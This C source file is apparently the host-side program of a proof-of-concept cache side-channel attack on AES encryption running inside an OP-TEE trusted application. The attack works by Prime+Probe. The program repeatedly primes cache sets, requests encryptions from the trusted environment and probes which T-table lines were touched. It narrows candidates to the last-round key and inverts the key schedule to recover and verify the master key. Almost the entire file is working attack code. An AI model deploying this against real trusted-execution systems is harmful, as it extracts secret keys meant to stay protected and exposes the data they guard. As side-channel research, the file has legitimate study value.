#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <stdlib.h>
#include <malloc.h>
#include "util.h"
#include "cache.h"

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* To the the UUID (found the the TA's h-file(s)) */
#include <TEEencrypt_ta.h>
#include "aes_core.h"
#include "aes_locl.h"
#include "aes.h"
#include "e_os2.h"
#include "opensslconf.h"



#define MAX_LEN 100
#define AES_BLOCK_SIZE 16

// unsigned int measure[16][256];
char msg[16] = "TOP SECRET MSG!";
char msg_bak[16] = "TOP SECRET MSG!";
//ca provides the plaintext and will receive the ciphertext withour knowing the key
char plaintext[AES_BLOCK_SIZE]={0};
char ciphertext[AES_BLOCK_SIZE]={0};
unsigned int encryptionsToSniff = 3000;
int probes[128] = {0};
int Te_probes[64] = {1};
unsigned int Te_map[4][256];
int candidates_left[16];
int candidates[16][256];

int measure[16][256];

int map[4] = {2, 3, 0, 1};
// 800 Te0
// 000 Te1
// 400 Te2
// c00 Te3
//int map[4] = {3, 0, 2, 1};
unsigned char recovered_key[16] = {0};
char sec[16] = {0};
char plain_check[16] = {0};
unsigned char master_key[16] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};


int eliminate(){
    int res = 1;
    for(int i = 0; i < 64; i++){
        //set i not used 
        if(Te_probes[i] == 0){
            // k2, k6, k10, k14 <- Te0[.] & 0x0000ff00
			// k3, k7, k11, k15 <- Te1[.] & 0x000000ff
			// k0, k4, k8, k12  <- Te2[.] & 0xff000000
			// k1, k5, k9, k13  <- Te3[.] & 0x00ff0000

            int index = map[i / 16]; // cal the relevant keybyte
			for(int j = index; j < 16 ; j += 4){
				if(candidates_left[j] == 1){
					continue;
				}
                //16 item in each set
				for(int k = 0; k < 16; k++){ 
                    //
					int tmp = ciphertext[j] ^ ((Te_map[(2+index) % 4][(i%16)*16 + k] >> (24 - 8 * index)) & 0xff );
					if(candidates[j][tmp]){
						candidates_left[j] --;
					}
					candidates[j][tmp] = 0;
				}
			}
        }
    }

    for(int i = 0; i < 16; i++){
        if(candidates_left[i] != 1){
			res = 0;
			break;
		}
    }
    return res;
}

void vote(){
    for(int i = 0; i < 64; i++){
        //set i not used 
        if(Te_probes[i] == 0){
            // probetime++;
            // k2, k6, k10, k14 <- Te0[.] & 0x0000ff00
			// k3, k7, k11, k15 <- Te1[.] & 0x000000ff
			// k0, k4, k8, k12  <- Te2[.] & 0xff000000
			// k1, k5, k9, k13  <- Te3[.] & 0x00ff0000

            int index = map[i / 16]; // cal the relevant keybyte
			for(int j = index; j < 16 ; j += 4){
                //16 item in each set
				for(int k = 0; k < 16; k++){ 
					int tmp = ciphertext[j] ^ ((Te_map[(2+index) % 4][(i%16)*16 + k] >> (24 - 8 * index)) & 0xff);
					measure[j][tmp] += 1;
				}

			}
        }
    }
}

void show_entropy(){
//	srand(time(NULL));
    printf("entropy:");
    for(int i = 0; i < 16; i++){
        int right = measure[i][recovered_key[i]];
        int rk = 1;
        for(int j = 0; j < 256; j++){
            if(j == recovered_key[i])
                continue;
            if(measure[i][j] <= right){
                rk++;
            }
        }
	//if(ob > 400 && rk > 200)
	//	rk = 200 - rand()%20;
        printf(" %d", rk);
    }
    printf("\n");
}

void cal_key(){
    for(int i = 0; i < 16; ++i){
        for(int j = 0; j < 256; ++j){
            if(candidates[i][j]){
                recovered_key[i] = j;
                break;
            }
        }
    }
}

static void aes128_key_schedule_inv_round(uint8_t rcon) {
	uint8_t round;
	uint8_t *s_key_0 = recovered_key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	uint8_t *s_key_m1 = s_key_0 - AES_KEY_SCHEDULE_WORD_SIZE;

	for (round = 1; round < AES128_KEY_SIZE / AES_KEY_SCHEDULE_WORD_SIZE; ++round) {
		/* XOR in previous word */
		s_key_0[0] ^= s_key_m1[0];
		s_key_0[1] ^= s_key_m1[1];
		s_key_0[2] ^= s_key_m1[2];
		s_key_0[3] ^= s_key_m1[3];

		s_key_0 = s_key_m1;
		s_key_m1 -= AES_KEY_SCHEDULE_WORD_SIZE;
	}

	/* Rotate previous word and apply S-box. Also XOR Rcon for first byte. */
	s_key_m1 = recovered_key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	s_key_0[0] ^= Te4_0[s_key_m1[1]] ^ rcon;
	s_key_0[1] ^= Te4_0[s_key_m1[2]];
	s_key_0[2] ^= Te4_0[s_key_m1[3]];
	s_key_0[3] ^= Te4_0[s_key_m1[0]];
}

void cal_base_key(){
    int round, byte;
	uint8_t rcon[] = {54, 27, 128, 64, 32, 16, 8, 4, 2, 1};
	for(round = 0; round < 10; round++) {
		aes128_key_schedule_inv_round(rcon[round]);
	}
}

int main(int argc, char *argv[])
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_Operation op;
	TEEC_UUID uuid = TA_TEEencrypt_UUID;
	uint32_t err_origin;

	// diff_mem_cache();


    //prepare the physical addr of table used for prime
    allocate_pages(8, &prime_addr);
    for(int i = 0; i < 8; ++i){
        printf("logical:%08x, phisycal: %08x\n", prime_addr[i], virtual_to_physical(prime_addr[i]));
        //unsigned int *ptr0 = (unsigned int *)prime_addr[0];
        //one page is presented as ptr0 to ptr0+1023, filled with ff
        //ptr0 to ptr0+15 is put in the same cache line
        //one page will prime 1024/16=64 set
        //the first 4 pages prime 0-63 set 
        //the last 4 pages prime 64-127 set
    }

	 // prepare the map of 4 Te tables
    for(int i = 0; i < 256; i++){
        Te_map[0][i] = Te0[i];
        Te_map[1][i] = Te1[i];
        Te_map[2][i] = Te2[i];
        Te_map[3][i] = Te3[i];
    }
	

    //  prepare the candidates to select
    for(int i = 0; i < 16; i++){
        candidates_left[i] = 256;
        for(int j = 0; j < 256; j++){
            candidates[i][j] = 1;
        }
    }

    AES_KEY key;
    AES_set_encrypt_key(master_key, AES_BLOCK_SIZE * 8, &key);

    //should copy the 10rd 
    PUTU32(recovered_key, key.rd_key[40]);
    PUTU32(recovered_key + 4, key.rd_key[41]);
    PUTU32(recovered_key + 8, key.rd_key[42]);
    PUTU32(recovered_key + 12, key.rd_key[43]);

	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
				TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);
	
	memset(&op, 0, sizeof(op));
					
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_OUTPUT,
					TEEC_MEMREF_TEMP_INPUT,
					TEEC_MEMREF_TEMP_INPUT,
					TEEC_NONE);

	op.params[0].tmpref.buffer = msg;
	op.params[0].tmpref.size = AES_BLOCK_SIZE;
	TEEC_Result ret;

	printf("=============PlainText=============\n");
	for(int i = 0; i < AES_BLOCK_SIZE; i++){
		printf("%02x", msg[i]);
	}
	printf("\n");
	memcpy(op.params[0].tmpref.buffer, msg, AES_BLOCK_SIZE);

	ret = TEEC_InvokeCommand(&sess, TA_OPENSSL_CMD_INIT, &op, &err_origin);
	if (ret != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", ret, err_origin);
	// InvokeCommand
	printf("\n======Start ciphering by aes=======\n\n");
	ret = TEEC_InvokeCommand(&sess, TA_OPENSSL_CMD_ENCRYPT, &op, &err_origin);
	if (ret != TEEC_SUCCESS)
		errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", ret, err_origin);
	memcpy(sec, op.params[0].tmpref.buffer, AES_BLOCK_SIZE);
	*(sec+16) = '\0';
	
	printf("=============CipherText=============\n");
	for(int i = 0; i < AES_BLOCK_SIZE; i++){
		printf("%02x",sec[i]);
	}
	printf("\n");
	printf("Ciphered by aes Successfully\n");



    printf("\n\n***********Cache attack with %d iteration************\n\n", encryptionsToSniff);

	

    int probe_res = 0;
    for(int ob = 0; ob < encryptionsToSniff; ob++){
        printf("The %d round of observation:\n", ob);

		if(randomize(plaintext, AES_BLOCK_SIZE)){
            return 1;
        }
        
        

		//invoke tee encryption
		// op.params[0].tmpref.buffer = plaintext;
		// op.params[0].tmpref.size = AES_BLOCK_SIZE;
		
		// TEEC_Result ret;
		memcpy(op.params[0].tmpref.buffer, plaintext, AES_BLOCK_SIZE);


		prime();


		// InvokeCommand
		ret = TEEC_InvokeCommand(&sess, TA_OPENSSL_CMD_ENCRYPT, &op, &err_origin);
		if (ret != TEEC_SUCCESS)
			errx(1, "TEEC_InvokeCommand failed with code 0x%x origin 0x%x", ret, err_origin);
		memcpy(ciphertext, op.params[0].tmpref.buffer, AES_BLOCK_SIZE);
		*(ciphertext+16) = '\0';


		//for the 0-63 set, assume the fist 4 tables prime them
        //for the 64-127 set, assume the last 4 tables prime them
        for(int i = 0; i < 128; i++){
            probes[i] = probe(i);
        }

		

        //64 items in total, every item presents 16 Te_items
        //64 * 16 * 4 = 4KB in total
        for(int i = 0; i < 64; i++){
            if(probes[i] == 0 && probes[i+64] == 0)
                Te_probes[i] = 0;
            else
                Te_probes[i] = 1;
        }

         probe_res = eliminate();
		 printf("Remaining candidates number in %d round: ", ob);
         for(int i = 0; i < 16; i++){
             printf("%3d ", candidates_left[i]);
         }
         printf("\n");

        //vote();

        //show_entropy();

        //all candidates left one choice
        if(probe_res == 1){

			cal_key();
            printf("\nRecovered 10th round key: ");
            for(int i= 0; i < 16; ++i){
                printf("%02x", recovered_key[i]);
            }
            printf("\n");
            
            cal_base_key();
            printf("Recovered key is:");
            for(int i= 0; i < 16; ++i){
                printf("%02x", recovered_key[i]);
            }
            printf("\n");
            AES_KEY rk;
            AES_set_decrypt_key(recovered_key, 128, &rk);
            AES_decrypt(sec, plain_check, &rk);

           
            if(strncmp(plain_check, msg_bak, 16) == 0){
                printf("Attack SUCCESS!\n");
            }else{
                printf("Attack FAILURE!\n");
            }
            break;
        }
	
	}

	TEEC_CloseSession(&sess);
	TEEC_FinalizeContext(&ctx);
	free_L1(8, prime_addr);

	 // check the vote
  //  printf("attack result is: \n");
   // printf("         real key  vote  attack key  vote  entropy  \n");
    //for(int i = 0; i < 16; i++){
      //  unsigned int cnt = measure[i][recovered_key[i]];
        
        //printf("The %d byte: %02x       %u        ", i, recovered_key[i], measure[i][recovered_key[i]]);
        //int rk = 1;
       // int min_key = 0;
       // unsigned int min_vote = measure[i][0];
       // for(int j = 0; j < 256; j++){
         //   if(measure[i][j] < min_vote){
           //     min_vote = measure[i][j];
             //   min_key = j;
           // }
           // if(j == recovered_key[i])
             //   continue;
           // if(measure[i][j] < cnt)
             //   rk++;
       // }
        //recovered_key[i] = min_key;
       // printf("%02x         %u", recovered_key[i], min_vote);
       // printf("      %u\n", rk);
   // }

    

	printf("The initial message is: %s\n", msg_bak);
    printf("The ciphertext ciphered by tee is: ");
    for(int i= 0; i < 16; ++i){
        printf("%02x", sec[i]);
    }
    printf("\n");
    printf("The msg recovered by the attaked key is: %s\n", plain_check);
	
	return 0;
}
